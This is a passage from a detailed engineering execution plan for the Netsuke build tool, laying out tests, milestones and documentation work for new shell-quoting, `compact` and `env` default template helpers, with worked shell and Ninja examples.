  defect rather than a filter defect.
- Method: parameterized `rstest` rendering a whole manifest through the real
  loader, once per position, asserting the generated Ninja `command =` text.
- Rationale: this is the plan's own worst failure mode. The first draft's
  acceptance transcript placed the interpolation inside `"..."`, where
  `printf '%s' "RUSTFLAGS=-D' warnings'"` emits the quote characters as data.
  Every other obligation exercises the filter in isolation and is structurally
  blind to it.
- Domain: the two positions, with a value containing a space and a single
  quote.
- Artefact: `tests/shell_filter_property_tests.rs`.
- Evidence: the unquoted case matches the documented example byte for byte; the
  double-quoted case is pinned as the *documented wrong answer*, so a future
  change that silently "fixes" it fails the test and forces a decision.
- Non-vacuity: the two cases must differ. If they ever produce equal output the
  test is measuring nothing.

**OBL-JOIN-QUOTE-AGREE** — `shell_join` is `shell_quote` distributed.

- Obligation: for every dialect `d` and every list `xs` of admissible strings,
  `join_for_recipe(d, xs)?` equals the elements individually passed through
  `quote_for_recipe(d, _)?` and joined with one space.
- Method: property test, `cases: 128`, both dialects.
- Rationale: the two filters share a `dialect` argument and a documented
  promise of "the same rules". This is the only obligation that makes that a
  fact rather than a docstring, and it is what earns `dialect` its place on
  both filters.
- Artefact: `tests/shell_filter_property_tests.rs`.
- Non-vacuity: include a list whose elements need quoting and one that does
  not; a `join` implementation that quoted only non-inert elements would pass a
  weaker test and must fail this one.

**OBL-KIND-GATE** — the sequence and string gates reject what `try_iter`
accepts.

- Obligation: `compact` and `shell_join` reject a mapping, a string, `none`,
  undefined, a number, and a boolean subject, each with an error naming the
  received kind; `shell_quote` rejects every non-string subject including a
  MiniJinja object, with no `to_string` fallback.
- Method: exhaustive parameterized `rstest` over the finite `ValueKind` set.
- Rationale: D8 exists because `Value::try_iter()` silently accepts three of
  these. The domain is a small closed enumeration, so exhaustive enumeration is
  the strongest available evidence.
- Artefact: `tests/std_filter_tests/collection_filters.rs` and
  `tests/shell_filter_property_tests.rs`.
- Non-vacuity: the negative control is a `try_iter`-based implementation, which
  must pass `{{ [1,2] | compact }}` and fail `{{ 'abc' | shell_join }}` and
  `{{ my_map | compact }}` for the intended reason.

**OBL-COMPOSITION** — the filters compose with the rest of the pipeline.

- Obligation: for each `RecipeShell` variant, a manifest whose recipe
  interpolates `shell_quote`/`shell_join` output containing a single quote and
  a dollar sign renders, lowers through `interpolate_command_with_bindings`,
  and generates Ninja text that the corresponding interpreter executes to the
  intended argument vector. For a command-list recipe, the same holds after the
  entry passes through `shell_single_quote`'s `eval` payload wrapper.
- Method: integration test over the full pipeline, plus a real-interpreter
  execution assertion where the host provides one (`sh` on Unix,
  `powershell.exe` on Windows CI).
- Rationale: every other obligation tests an encoder in isolation.
  `is_valid_command_for_shell` (`src/ir/cmd_interpolate/mod.rs:226-231`) returns
  `true` unconditionally for PowerShell, so nothing downstream checks that
  path at all; and the command-list renderer's input distribution changes once
  a filter routinely emits single quotes. Neither is covered by any isolated
  test.
- Domain: three `RecipeShell` variants × {scalar command, command list}.
- Artefact: `tests/shell_filter_composition_tests.rs` (new; a top-level
  `tests/*.rs` so `tests/integration_test_wiring_tests.rs` discovers it).
- Evidence: assert the final `command =` text *and*, where an interpreter is
  available, the argument vector it actually produces.
- Non-vacuity: include a value containing `$`, so the assertion also exercises
  ADR-014's `$`-doubling; a seeded fault that drops the `$$` escaping must fail
  it.

**OBL-QUERY-SURFACE** — the manifest-query surface stays coherent.

- Obligation: under `register_manifest_query`, `compact`, `shell_quote`, and
  `shell_join` render successfully, and `env('X', default='y')` fails with the
  "disabled while rendering `netsuke help targets`" marker — not with an
  argument-count error.
- Method: parameterized `rstest` rendering each template against an environment
  built by `crate::stdlib::register_manifest_query`.
- Rationale: R8 records that nothing else enforces this; the `env` stub's arity
  changes in EP-M1 and would otherwise fail with the wrong diagnostic.
- Artefact: `tests/stdlib_manifest_query_tests.rs` (new; must be a top-level
  `tests/*.rs` so `tests/integration_test_wiring_tests.rs` discovers it).
- Non-vacuity: assert the *specific* marker text via
  `stdlib::is_manifest_query_disabled_error`-equivalent substring, not merely
  "an error occurred". Negative control: assert that the same template under
  `register_with_config` does **not** produce that marker.

### Behavioural specification (rstest-bdd)

Added to `tests/features/stdlib.feature`. The steps already exist in
`tests/bdd/steps/stdlib/` — `a stdlib workspace`,
`I render the stdlib template {template:string} without context`,
`the stdlib output equals {expected:string}`, and
`the stdlib error contains {fragment:string}` — so **no new step module is
needed** and `tests/bdd/steps/mod.rs` is untouched. Confirm each step's exact
wording in `tests/bdd/steps/stdlib/{rendering,assertions,workspace}.rs` before
writing the feature; if a needed step is missing, add it to the existing module
rather than creating a new one.

```gherkin
  Scenario: compact drops empty and null members but keeps zero
    Given a stdlib workspace
    When I render the stdlib template "{{ [0, '', none, 'x'] | compact | join(',') }}" without context
    Then the stdlib output equals "0,x"

  Scenario: shell_quote makes a metacharacter-bearing value one sh word
    Given a stdlib workspace
    When I render the stdlib template "{{ \"a b '$HOME'\" | shell_quote(dialect='sh') }}" without context
    Then the stdlib output equals "a' b '\\''$HOME'\\'"

  Scenario: shell_join quotes each element separately
    Given a stdlib workspace
    When I render the stdlib template "{{ ['-C', 'target-cpu=native', 'a b'] | shell_join(dialect='sh') }}" without context
    Then the stdlib output equals "-C target-cpu'=native' a' b'"

  Scenario: shell_quote rejects an unknown dialect and names the accepted set
    Given a stdlib workspace
    When I render the stdlib template "{{ 'x' | shell_quote(dialect='bash') }}" without context
    Then the stdlib error contains "netsuke::jinja::shell::args"
    And the stdlib error contains "powershell"

  Scenario: shell_quote rejects a value containing a line feed
    Given a stdlib workspace
    When I render the stdlib template "{{ 'a\nb' | shell_quote(dialect='sh') }}" without context
    Then the stdlib error contains "netsuke::jinja::shell::unquotable"

  Scenario: shell filter errors keep their code when localised
    Given a stdlib workspace
    And the localisation locale is "es-ES"
    When I render the stdlib template "{{ 'x' | shell_quote(dialect='bash') }}" without context
    Then the stdlib error contains "netsuke::jinja::shell::args"

  Scenario: shell_join rejects a string subject rather than quoting its characters
    Given a stdlib workspace
    When I render the stdlib template "{{ 'abc' | shell_join(dialect='sh') }}" without context
    Then the stdlib error contains "netsuke::jinja::shell::args"

  Scenario: shell_quote rejects a positional dialect
    Given a stdlib workspace
    When I render the stdlib template "{{ 'x' | shell_quote('sh') }}" without context
    Then the stdlib error contains "netsuke::jinja::shell::args"

  Scenario: env rejects a non-string default rather than stringifying it
    Given a stdlib workspace
    When I render the stdlib template "{{ env('NETSUKE_ABSENT', default=['a']) }}" without context
    Then the stdlib error contains "netsuke::jinja::env::args"
```

The expected `sh` strings above are **verified**, not guessed. They are the
`shell-quote` crate's *fragmented* form, derived from `escape_chars` and
`Char::from` in `shell-quote-0.7.2/src/{sh,ascii}.rs` and confirmed by running
the quoted text through a real `/bin/sh`. Two consequences are
counter-intuitive and must not be "corrected" during implementation:

1. Quoting opens and closes around runs, so `a b` becomes `a' b'`, not
   `'a b'`. Alphanumerics, comma, full stop, solidus, underscore, and hyphen
   are the only characters the crate treats as inert.
2. The equals sign is **not** inert, so `target-cpu=native` becomes
   `target-cpu'=native'`. This is correct but surprising in flag-heavy output.

If an observed value differs from the above, the crate version has changed;
record that in `Surprises & discoveries` and re-derive, rather than adjusting
the implementation to match a guess.

## Plan of work

### Stage A — orient and confirm (no code changes)

Read, in order: this plan's "Context and orientation"; `AGENTS.md`;
`docs/adr-008-environment-seam-taxonomy.md`; `docs/netsuke-design.md` §§2.6,
4.4, 4.5; `docs/rfcs/0006-ansible-inspired-template-standard-library.md` §§8.9
and 13; `docs/users-guide.md:330-348` and `:458-495`;
`docs/stdlib-yaml-and-jinja-guide.md` in full;
`docs/rust-testing-with-rstest-fixtures.md`; `docs/rstest-bdd-users-guide.md`;
`docs/rust-doctest-dry-guide.md`;
`docs/reliable-testing-in-rust-via-dependency-injection.md`;
`docs/documentation-style-guide.md`; `docs/localization-styleguide.md`;
`docs/translators-guide.md` §§4-5.

Two house rules trip cold executors on exactly this shape of work, so they are
repeated here rather than left to the blanket "read `AGENTS.md`":

- `.expect()` is banned outside `#[test]` and `#[cfg(test)]` bodies, and
  `allow-expect-in-tests = true` does **not** cover shared test fixtures. The
  witness tables and negative-control helpers under OBL-SH-ROUNDTRIP and
  OBL-COMPACT are exactly where the temptation arises. Return `Result` and use
  `?`.
- Function attributes go **after** doc comments, and single-line function
  bodies are preferred where they fit.

Load these skills before writing code: `rust-router` (then whichever single
follow-on it routes to — most likely `rust-types-and-apis` for the
`ShellDialect` surface and `rust-errors` for the policy error),
`rust-unit-testing`, `proptest`, `hexagonal-architecture`,
`arch-decision-records` (for ADR-021), `en-gb-oxendict`, and `commit-message`.

Then confirm three facts against the working tree, because the plan depends on
them:

1. `grep -n "shell_escape\|shell_join\|compact" -r src/` returns nothing that is
   a Jinja helper.
2. `ls docs/adr-02*.md` shows `adr-020` as the highest, and
   `git ls-remote --heads origin` plus
   `git ls-tree -r --name-only origin/<branch> -- docs/` for each in-flight
   branch shows no `adr-021`. If 021 is taken, use the next free number and
   update every reference in this plan.
3. `cargo tree -i shell-quote` shows the `sh` feature only.

Go/no-go: if any of the three is false, stop and escalate.

### Stage B — red tests

Each milestone below opens with its failing test. Do not write production code
before observing the intended failure.

### Stage C — implementation with verification

Milestones EP-M1 to EP-M4.

### Stage D — documentation, reconciliation, and wide validation

Milestone EP-M5.

## Milestones and plateaus

Every milestone ends with
`make check-fmt && make typecheck && make lint &&
make doc-coverage && make test`
green and a commit. No milestone introduces a compatibility alias, facade, or
deprecated entry point: the crate is pre-1.0, has no external consumers, and
every caller is in-tree, so each interface is updated together with all of its
callers (see constraint 7).

### EP-M1 — extract `src/manifest/registration.rs`, then `env(name, default=...)`

- Identifier and outcome: manifest helper registration lives in its own module;
  `env` accepts an optional `default` keyword argument, type-checked rather
  than stringified; the manifest-query stub accepts the same shape; both
  existing diagnostics are unchanged.
- Requirements: `RM-3.14.8` bullet 1, `DD-4.4`.
- **Do the extraction first.** `src/manifest/mod.rs` is exactly 400 lines, and
  constraint 8 caps files at 400, so the first edit would breach it. Move
  `RESERVED_VAR_NAMES`, `localize_recipe_error`, `register_manifest_vars`, and
  `manifest_structure_error` into `src/manifest/registration.rs`, then move the
  `env` and `glob` registrations there too. Commit that as a pure move with no
  behaviour change and green gates, so the rename is reviewable on its own. Use
  exactly that module name and member set; see R9.
- Red: add the `OBL-ENV-DEFAULT` cases to `tests/manifest_env_tests.rs` and the
  unit cases to `src/manifest/tests/env_function.rs`, plus the non-string and
  undefined `default` cases from D4 and the positional case from AX-4. Run
  `cargo nextest run --test manifest_env_tests` and observe failures citing an
  unexpected keyword argument.
- Green: rename `env_var_with` to `env_var_with_default` with the `fallback`
  parameter and the `tracing::debug!(fallback_used = true, ...)` line (R10); add
  `env_default_from_kwargs` reading `Option<Value>` per D4; update the
  registration to take `Kwargs`; update the disabled stub at
  `src/stdlib/register.rs:173-176`. Add the `manifest.env.args_error` and
  `manifest.env.default_not_string` keys to all 35 catalogues. Add the
  `OBL-QUERY-SURFACE` `env` case to `tests/stdlib_manifest_query_tests.rs`.
- Refactor: keep `env_var_with_default` under 40 lines; extract the fallback
  decision into a named predicate if the match grows a third arm.
- Acceptance evidence: `cargo build` succeeds, proving the localization audit
  passes; `cargo nextest run --test manifest_env_tests` passes; the two `insta`
  inline snapshots pass **without** `INSTA_FORCE_UPDATE`; `git status --short`
  shows no `.snap` change; `wc -l src/manifest/mod.rs` reports under 400.
- Conformance check: `DD-4.4`'s "It returns an error if the variable is
  undefined and no `default` is provided, or if the variable contains invalid
  UTF-8" is satisfied exactly; RFC 0006 §6.6's no-silent-coercion rule is
  satisfied; no new dependency; trace links current.
- Recovery: two commits, revert either independently; `env()` returns to its
  one-argument form.
- Remaining gaps: documentation of `default=` (EP-M5).
- Compatibility decision: none required.

### EP-M2 — `compact`

- Identifier and outcome: `values | compact` is available on both registration
  surfaces and drops null, undefined, and empty-string members while preserving
  order.
- Requirements: `RM-3.14.8` bullet 3 (partial), `DD-4.5`.
- Red: add the `OBL-COMPACT` property and the explicit witness case to
  `tests/std_filter_tests/collection_filters.rs`; add the `compact` scenario to
  `tests/features/stdlib.feature`. Observe the unknown-filter failure.
- Green: implement `compact_filter` in `src/stdlib/collections.rs` beside
  `uniq_filter` and `flatten_filter`, and register it in `register_filters`.
  Non-sequence input errors through `values.try_iter()?`, exactly as `uniq`
  does, so no new message key is needed.
- Refactor: if `src/stdlib/collections.rs` passes 400 lines, split it into a
  directory module as described under "Interfaces and dependencies".
- Acceptance evidence: `cargo nextest run -E 'test(compact)'` passes; the naive
  truthiness implementation (negative control) fails the witness case.
- Conformance check: `DD-4.5`'s wording is matched exactly; `compact` reaches
  the manifest-query surface for free because `collections::register_filters`
  is shared — confirm by adding the `compact` case to
  `tests/stdlib_manifest_query_tests.rs`.
- Recovery: revert; the filter disappears with no other effect.
- Remaining gaps: documentation (EP-M5).
- Compatibility decision: none required.

### EP-M3 — shared recipe-shell quoting seam

- Identifier and outcome: a single `quote_word` implementation exists in
  `src/recipe_shell/quoting.rs`; `quote_path` delegates to it; `ShellDialect`
  and `StdlibConfig::with_recipe_shell` exist; generated Ninja is unchanged.
  This milestone registers **no** new template helper — it is a pure structural
  plateau, safe to stop at.
- Requirements: `RM-6.8.3`'s "no second quoting implementation is introduced";
  `ADR-014`.
- Red: add `OBL-DIALECT-TOTAL` tests in `src/stdlib/shell/dialect.rs`; run the
  OBL-NINJA-STABLE non-vacuity check (deliberately break `quote_word`, observe
  a named snapshot fail, revert) and record the snapshot name.
- Green: promote `src/recipe_shell.rs` to `src/recipe_shell/mod.rs`; add
  `quoting.rs` with the body moved from `quote_path`; reduce `quote_path` to a
  delegating call; add `src/stdlib/shell/dialect.rs`; add the `recipe_shell`
  field and builder to `StdlibConfig`.
- Refactor: update the `//!` comment on `src/recipe_shell/mod.rs` to state its
  new responsibility and its position below IR, Ninja, and the standard library.
- Acceptance evidence: `make test` passes;
  `git status --short src/snapshots tests/snapshots` prints nothing.
- Conformance check: exactly one recipe-shell quoting implementation remains;
  `src/stdlib/command/quote.rs` and `shell_single_quote` are untouched; no
  persisted or wire format changed; `RecipeShell` visibility widened only as
  far as `with_recipe_shell` requires.
- Recovery: the extraction is a pure move; revert restores the prior file.
- Remaining gaps: the filters themselves (EP-M4); the runner still injects
  `host_default()`; EP-M4 replaces it with the resolved shell in the same
  commit that registers the filters, so the divergence is never shipped.
- Compatibility decision: none required — `from_str_with_env_and_config` and
  `StdlibConfig` are pre-1.0 and every caller is in-tree.

### EP-M4 — `shell_quote` and `shell_join`, with the resolved dialect

The first draft split this in two: register the filters against
`RecipeShell::host_default()`, then plumb the resolved shell in a later
milestone. **That split is not safe to stop between.** On a Windows host with
`NETSUKE_WINDOWS_SHELL=bash`, the intermediate state quotes for PowerShell
while the recipe runs under Bash. PowerShell quoting doubles an embedded single
quote, so `a'b` becomes `'a''b'`, which a POSIX shell reads as two adjacent
quoted strings concatenated — `ab`. Syntactically valid, so `shlex::split`
accepts it and nothing complains. The build succeeds and the artefact is wrong.
See R11 and constraint 10. The two are therefore one milestone.

- Identifier and outcome: both filters are registered on both surfaces, quoting
  for the dialect of the interpreter that will actually run the recipe, with
  the new message keys present in all 35 catalogues.
- Requirements: `RM-3.14.8` bullets 2 and 3; `DD-4.5`; `RFC-0006-8.9` as
  amended by D2; `UG-WIN`.
- Red: write `tests/shell_filter_property_tests.rs` with OBL-SH-ROUNDTRIP,
  OBL-PS-ROUNDTRIP, OBL-ONE-WORD, OBL-JOIN-SPLIT, OBL-JOIN-QUOTE-AGREE,
  OBL-KIND-GATE, OBL-NO-ESCAPE and OBL-CONTEXT with their negative controls;
  write `tests/shell_filter_composition_tests.rs` with OBL-COMPOSITION; add the
  `shell_*` scenarios to `tests/features/stdlib.feature`. Add the test that
  builds a `StdlibConfig` with `.with_recipe_shell(RecipeShell::Bash)` and
  asserts `sh` quoting, asserting at the **runner** seam so it is not
  tautological. Observe compilation failure, then unknown-filter failures.
- Green: add `src/shell_word.rs`; add `src/stdlib/recipe_text/`; rename
  `src/stdlib/command/quote.rs` to `child_argument.rs`; wire
  `recipe_text::register_filters` into both `register_read_only_helpers` and
  `register_query_helpers`; thread
  `ExecutionContext.graph_generation.recipe_shell` from `src/runner/mod.rs:149`
  through the manifest-generation path into the `StdlibConfig` built in
  `src/manifest/query.rs`; add the `clippy.toml` entry and its two
  `#[expect(...)]` sites; add the shell message keys to
  `src/localization/keys.rs` and to all 35 catalogues.
- Refactor: if a manifest-loading function would exceed four parameters, group
  them into a named struct per `AGENTS.md`. Keep every new file well under 400
  lines and give each new function a `///` comment as it is written, not
  afterwards.
- Acceptance evidence: `cargo build` succeeds, proving the localization audit
  passes; the property, composition and BDD suites pass; every negative control
  fails as designed when its broken implementation is substituted; the
  `RecipeShell::Bash` test fails when the runner plumbing is reverted while the
  config seam is kept — record that transcript.
- Conformance check: the registered names match `RFC-0006-8.9` as amended;
  exactly one `shell_quote::QuoteRefExt::quoted` call site outside the two
  `#[expect(...)]`ed ones, now enforced by Clippy; both filters are pure given
  a dialect (D6) and correctly available to manifest queries; the query-surface
  dialect divergence is pinned by an assertion rather than left latent;
  constraint 10 holds; trace links updated.
- Tolerance note: this milestone changes a public signature outside
  `src/manifest/` and `src/stdlib/config/` — the manifest-loading entry points
  gain a recipe-shell parameter. That trips tolerance 2 **by design**, and it
  is recorded here rather than discovered mid-milestone. No escalation is
  needed for this specific, foreseen change; any *further* public signature
  change still escalates.
- Recovery: revert; the filters, their keys, and the plumbing disappear
  together. Reverting only part of it would recreate R11, so revert whole.
- Remaining gaps: documentation (EP-M5).
- Compatibility decision: none required — pre-1.0, all callers in-tree, and
  the template surface is new rather than changed (constraint 7b).

### EP-M5 — documentation, ADR, and reconciliation

- Identifier and outcome: every document that described these helpers as
  planned or unimplemented now describes what ships, a worked `RUSTFLAGS`
  example is executed by the test suite, ADR-021 records D1-D3, and the roadmap
  entry is ticked.
- Requirements: all of `RM-3.14.8`; `RM-3.14.8` bullet 4 specifically.
- Work:
  1. Write `docs/adr-021-canonical-recipe-shell-quoting-surface.md` following
     the Y-Statement shape of `docs/adr-008-environment-seam-taxonomy.md`
     (`# Architecture decision record (ADR): …`, then `## Status`, `## Date`,
     `## Context and problem statement`, `## Decision`, `## Consequences`).
     Record D1, D2, and D3 with their evidence. Add it to `docs/contents.md`.
  2. `docs/netsuke-design.md` §4.4: replace "The `default` argument is planned;
     the current implementation only accepts the variable name" with the shipped
     contract, including the empty-string rule and the non-UTF-8 rule.
  3. `docs/netsuke-design.md` §4.5: rename `shell_escape` to `shell_quote`,
     record the two-dialect set and the host-default rule, drop "planned" from
     `shell_join` and `compact`, and link ADR-021.
  4. `docs/netsuke-design.md:686-689` and `:3664-3667`: rename `shell_escape`.
  5. `docs/users-guide.md:490`: replace the "not implemented in beta3" sentence
     with a description of `shell_quote`, its default dialect, and the pointer
     to `docs/stdlib-yaml-and-jinja-guide.md`. Cross-reference
     `docs/users-guide.md:330-348` so a Windows reader understands why the
     default differs.
  6. `docs/users-guide.md:774-775`: replace the sentence beginning "Beta3 does
     not accept a default argument" with the shipped `env(name, default=…)`
     contract, including the empty-string and non-UTF-8 rules.
  7. `docs/stdlib-yaml-and-jinja-guide.md`: add `compact` to "Transform
     collections"; add a new "Build shell recipe text" section documenting
     `shell_quote` and `shell_join` with their dialect rules and purity; update
     the `env(name)` bullet at lines 318-320. Add the tested example:

     ```markdown
     <!-- tested-example: stdlib-optional-rustflags-manifest -->
     ```

     carrying the `RUSTFLAGS` manifest from "Purpose / big picture", with an
     explicit `dialect='sh'` so it is host-independent (R4).
  8. Register `stdlib-optional-rustflags-manifest` in `EXPECTED_EXAMPLE_IDS`
     (`tests/documentation_examples_tests.rs:18-61`, alphabetical) and add it as
     a `#[case]` to `documented_manifest_generates_ninja`.
  8a. Add two bounded, label-safe counters beside the existing manifest
      instrumentation, following `docs/adr-009-bounded-redacted-manifest-telemetry.md`:
      `netsuke_manifest_shell_quote_dialect_total{dialect, source}` where
      `source` is `explicit` or `default` (a four-combination label space), and
      `netsuke_manifest_env_default_substituted_total` with no labels. Neither
      carries manifest content, a variable name, or a value. The first makes
      the population exposed to R11 and D10 visible in aggregate; the second
      makes R10 visible. Describe both with `describe_counter!`.
  8b. Write the precise guide contract for each helper, not a summary. At
      minimum: `shell_quote` renders one string as exactly one word for the
      named shell, and for `dialect='sh'` a POSIX shell splitting the output
      produces exactly one field byte-identical to the input; the empty string
      renders as `''`, not as nothing; the subject must be a string, and
      numbers, booleans, sequences, mappings, `none`, and undefined are errors;
      tab, escape, and non-ASCII text are preserved, while NUL, carriage
      return, and line feed are rejected. `shell_join` never drops an element,
      so `['']` renders as one empty word — that is why `compact` and
      `shell_join` are separate helpers — it does not flatten a nested list,
      and its separator is exactly one space. `compact` drops `none`,
      undefined, and the empty string only: `0`, `false`, `[]`, `{}`, and a
      whitespace-only string are retained, which is what distinguishes it from
      MiniJinja's `select`. State that `shell_quote` and `shell_join` are
      filters with no function form, and that both are correct **only in
      unquoted argv position**.
  9. `docs/developers-guide.md`: extend the quoting-paths paragraph at lines
     445-458 to name the new fourth path — `src/recipe_shell/quoting.rs` as the
     single recipe-shell word quoter used by both `quote_path` and the
     `shell_quote`/`shell_join` filters — and state that
     `src/stdlib/command/quote.rs` and `shell_single_quote` remain distinct.
     Also record: the "add a helper to both registration surfaces" convention;
     the 35-catalogue message rule and the requirement to copy the bracketed
     `[netsuke::jinja::…]` code verbatim into every translation; the rule that
     `Value::try_iter()` is not a sequence check (D8); the argument-style rule
     that trailing `Option<T>` is for options reading naturally in a fixed
     order while `Kwargs` is for independent named options and any enumerated
     value set expected to widen; and the deliberate query-surface dialect
     divergence.
  10. `docs/repository-layout.md`: add `src/stdlib/shell/` and note the
      `src/recipe_shell/` promotion.
  11. `docs/rfcs/0006-ansible-inspired-template-standard-library.md` §§8.9 and
      13.3: record the amended dialect set and note that 3.14.8 delivered it.
      Keep the edit to those two locations (R3).
  12. `CHANGELOG.md`: one entry under the unreleased heading, following the
      Common Changelog style already used in the file.
  13. `docs/roadmap.md:282-295`: tick 3.14.8 and all four sub-bullets; rewrite
      the trailing `Note:` to describe what shipped. Add a one-line note to
      `RM-6.8.3` (lines 1103-1110) recording that 3.14.8 delivered the canonical
      name and the dialect argument, and that only the wider RFC 0006 dialect
      set remains. Do **not** tick 6.8.3.
- Acceptance evidence: `make markdownlint`, `make nixie`, `make check-fmt`, and
  `make test` all pass; `cargo nextest run --test documentation_examples_tests`
  passes, proving the `RUSTFLAGS` manifest generates valid Ninja.
- Conformance check: no `shell_escape` reference remains
  (`grep -rn "shell_escape" docs/ src/` returns nothing); every upstream
  identifier in `Conformance basis` is either satisfied or has a recorded,
  accepted deviation; the RFC 0006 amendment is the only upstream document
  changed.
- Recovery: documentation-only; revert individually.
- Remaining gaps: none for `RM-3.14.8`.
- Compatibility decision: none required.

## Concrete steps

All commands run from the repository root,
`/home/leynos/.lody/repos/github---leynos---netsuke/worktrees/c72b2360-e95a-451a-b637-1e84cf3eb4b8`,
on branch `3-14-8-jinja-command-helpers-to-match-documented-ergonomics`.

Capture every long-running gate through `tee`, using the project's log naming
convention so output survives truncation:

```sh
make test 2>&1 | tee "/tmp/test-$(get-project)-$(git branch --show-current).out"
```

Delegate full gate runs to the `scrutineer` subagent rather than running them
in the planning context; read the cited log on failure instead of re-running.

Per-milestone loop:

```sh
# 1. Red: write the failing test, then run only it.
cargo nextest run --test manifest_env_tests 2>&1 \
  | tee /tmp/red-3-14-8.out

# Expect, before implementation:
#   FAIL [   0.012s] netsuke::manifest_env_tests env_default_substitutes_for_absence
#   ... unknown keyword argument `default`

# 2. Green: implement, then re-run the same focused command.
cargo nextest run --test manifest_env_tests 2>&1 | tee /tmp/green-3-14-8.out
#   Summary [   0.9s] 14 tests run: 14 passed

# 3. Confirm no snapshot drifted.
git status --short src/snapshots tests/snapshots
#   (expect no output)

# 4. Full gates, sequentially — never in parallel.
make check-fmt && make typecheck && make lint && make doc-coverage && make test

# 5. Commit.
git add -A && git commit
```

For EP-M4, run `cargo build` before `make test`: the localization audit is a
build-script failure, and finding a missing catalogue entry there is far faster
than through the test suite.

```sh
cargo build 2>&1 | tee /tmp/l10n-3-14-8.out
# A missing catalogue looks like:
#   error: localization audit failed:
#   - missing in ar: stdlib.shell.quote.not_string
#   - missing in cs: stdlib.shell.quote.not_string
```

## Validation and acceptance

Quality criteria — what "done" means:

- **Tests**: `make test` passes. The new suites
  `tests/shell_filter_property_tests.rs` and
  `tests/stdlib_manifest_query_tests.rs` pass, and the five new
  `tests/features/stdlib.feature` scenarios pass through `tests/bdd_tests.rs`.
  `tests/documentation_examples_tests.rs` passes with the new example id.
- **Verification**: OBL-SH-ROUNDTRIP, OBL-PS-ROUNDTRIP, OBL-ONE-WORD,
  OBL-JOIN-SPLIT, OBL-COMPACT, OBL-ENV-DEFAULT, OBL-DIALECT-TOTAL,
  OBL-NINJA-STABLE, OBL-NO-ESCAPE, and OBL-QUERY-SURFACE are each discharged,
  with their negative controls observed failing at least once and recorded in
  `Artefacts and notes`. AX-2's residual gap on non-Windows hosts is stated in
  ADR-021.
- **Lint and typecheck**: `make check-fmt`, `make typecheck`, `make lint`, and
  `make doc-coverage` all exit zero. `make markdownlint` and `make nixie` pass.
- **Performance**: no benchmark threshold applies.
  `tests/shell_filter_property_tests.rs` must complete within 10 seconds under
  `cargo nextest run`; if it does not, reduce the subprocess property's `cases`
  before considering `#[ignore]`, and escalate if 32 cases is still too slow.
- **Security**: `shell_quote`'s soundness is the security property, and
  OBL-SH-ROUNDTRIP plus OBL-ONE-WORD are its evidence. Confirm that no new
  message text includes an environment variable name or value, matching the
  deliberate omission at `src/manifest/env_reader.rs:83-89`.

Behavioural acceptance, verifiable by hand. Note that the interpolation sits in
**unquoted** position — this is the precondition, and the first draft of this
plan got it wrong:

```sh
cd "$(mktemp -d)"
cat > Netsukefile <<'EOF'
netsuke_version: "1.0.0"
vars:
  base_flags: "-D warnings"
targets:
  - name: stamp.txt
    command: >-
      env RUSTFLAGS={{ [base_flags, env('RUSTFLAGS', default='')]
        | compact | join(' ') | shell_quote(dialect='sh') }}
      sh -c 'printf "%s\n" "$RUSTFLAGS"' > {{ outs }}
defaults:
  - stamp.txt
EOF
netsuke --progress never generate --output build.ninja
grep RUSTFLAGS build.ninja
```

Expect, with `RUSTFLAGS` unset, the recipe to carry `-D warnings` as exactly
one shell word in the crate's fragmented form:

```plaintext
  command = env RUSTFLAGS=-D' warnings' sh -c 'printf "%s\n" "$$RUSTFLAGS"' > stamp.txt
```

The `$$` is Ninja escaping applied at the writer boundary per ADR-014; Ninja
un-escapes it to a single `$` before the shell sees it. Running `netsuke build`
then writes exactly `-D warnings` to `stamp.txt` — quote characters absent,
because they were shell syntax rather than data.

With `RUSTFLAGS='-C target-cpu=native'` exported, expect the two flag groups
joined by one space and quoted as a single word:

```plaintext
  command = env RUSTFLAGS=-D' warnings -C target-cpu'=native'' sh -c … > stamp.txt
```

In both cases there must be no `${...:+...}` expansion anywhere, and no empty
argument when `RUSTFLAGS` is unset. Confirm the word count directly rather than
by eye:

```sh
sh -c "set -- -D' warnings -C target-cpu'=native''; echo \$#"
# 1
```

Contrast that with the defective form this plan originally specified, which
placed the interpolation inside double quotes:

```sh
sh -c 'printf "%s\n" "RUSTFLAGS=-D'"'"' warnings'"'"'"'
# RUSTFLAGS=-D' warnings'      <- literal quote characters; the value is corrupt
```

These expectations were derived from `shell-quote-0.7.2` and checked against a
real `/bin/sh`; see the note under the behavioural specification for the two
counter-intuitive rules that produce them. real `/bin/sh`; see the note under
the behavioural specification for the two counter-intuitive rules that produce
them.

## Idempotence and recovery

Every step is re-runnable. `make` targets are pure checks or in-place
formatters. The only step that mutates tracked files unexpectedly is
`make fmt`, which may reformat Markdown that was already non-canonical; commit
such reformatting separately.

Each milestone is one commit, so `git revert <sha>` restores the previous
plateau. EP-M3 is a pure move, so reverting it cannot change generated output.
No step writes outside the repository except `tee` logs under `/tmp`.

If the localization audit fails mid-edit, the tree still builds once every
catalogue has the key; there is no partial state to clean up.

## Progress

- [x] (2026-09-08) Reconnaissance complete: `env()` implementation and seam,
      registration surfaces, recipe-shell semantics, existing quoting paths,
      localization gate, test and documented-example infrastructure.
- [x] (2026-09-08) Design decisions D1-D7 recorded; D1 and D2 confirmed by the
      requester.
- [x] (2026-09-08) ExecPlan drafted.
- [x] (2026-09-09) Six-lens community-of-experts review completed and applied.
      Falsified three MiniJinja assumptions (D4, D8, AX-4), corrected the
      `quote_path` citation, restated the encoder inventory as five, redrew
      three module boundaries, fixed the acceptance transcript's
      double-quoted-context defect, added the threat model, and fused the
      former EP-M4 and EP-M5 to close R11.
- [ ] Plan approved by the requester.
- [ ] EP-M1 `env(name, default=...)`.
- [ ] EP-M2 `compact`.
- [ ] EP-M3 shared recipe-shell quoting seam.
- [ ] EP-M4 `shell_quote` and `shell_join`.
- [ ] EP-M5 documentation, ADR-021, roadmap tick.

## Surprises & discoveries

- Observation: Netsuke runs Windows recipes under Windows PowerShell, not
  `cmd.exe`, and `src/ir/cmd_interpolate/mod.rs` already implements a second
  quoting dialect for it. Evidence: `src/recipe_shell.rs:19-26`,
  `src/ninja_gen_recipe_shell.rs:16-17`, `docs/users-guide.md:330-348`,
  `src/ir/cmd_interpolate/mod.rs:137-150`. Impact: invalidates `RFC-0006-8.9`'s
  premise that `sh` is the only dialect Netsuke can quote for; drives D2 and
  the fusion of filter registration with runner plumbing in EP-M4.
- Observation: `src/stdlib/command/quote.rs` produces `cmd.exe` quoting on
  Windows, but it is never exposed to templates — it supports the `shell` and
  `grep` filters, which spawn a process through the platform shell. Evidence:
  `src/stdlib/command/mod.rs:81-111` registers only `shell` and `grep`;
